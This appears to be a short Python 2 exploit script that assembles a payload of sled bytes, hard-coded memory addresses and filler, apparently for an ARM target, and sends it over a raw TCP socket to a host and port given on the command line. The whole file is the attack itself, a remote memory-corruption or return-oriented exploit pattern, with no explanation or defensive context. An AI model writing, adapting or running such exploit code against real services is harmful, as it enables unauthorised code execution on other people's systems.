#!/usr/bin/python

import sys, socket

shellcode = ("\x01\x10\xa0\xe1"*26
+"\x3c\x05\x93\x76"
+"\x44\x69\x9d\x76"+"JUNK"+"\x54\x01\x8f\x76")

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
sock.connect(( sys.argv[1], int(sys.argv[2]) ))
sock.send(shellcode)
sock.close()

print "Shellcode Length: %d" %len(shellcode)

